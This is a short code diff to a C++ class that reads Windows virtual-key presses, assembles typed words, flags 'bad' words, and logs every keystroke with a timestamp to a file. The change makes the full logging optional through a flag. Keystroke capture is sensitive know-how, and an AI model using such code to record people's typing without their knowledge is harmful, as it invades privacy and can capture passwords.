@@ -68,9 +68,11 @@ void WordOfVkeys::AddVkeyToWord(WPARAM vkey)
 		}
 	}
 
-	//запись всех нажатых клавиш в файл
-	std::string info = "'" + std::string(1, keySymb) + "' : " + currTime;
-	WriteTofile(_whereToWriteKeys, info);
+	if (_isLogAllKeys) {
+		//запись всех нажатых клавиш в файл
+		std::string info = "'" + std::string(1, keySymb) + "' : " + currTime;
+		WriteTofile(_whereToWriteKeys, info);
+	}
 }
 
 HKL WordOfVkeys::GetCurrentLayout() {
@@ -160,7 +162,7 @@ bool WordOfVkeys::IsCurrWordBad()
 }
 void WordOfVkeys::AddSymbToWord(char symb)
 {
-	if (symb == char(VK_SPACE) || symb == char(VK_ACCEPT) || symb == char(VK_RETURN))
+	if (symb == char(VK_SPACE) || symb == char(VK_TAB) || symb == char(VK_RETURN))
 		_currWord = "";
 	else if (symb == char(VK_BACK) && _currWord != "")
 		_currWord.pop_back();
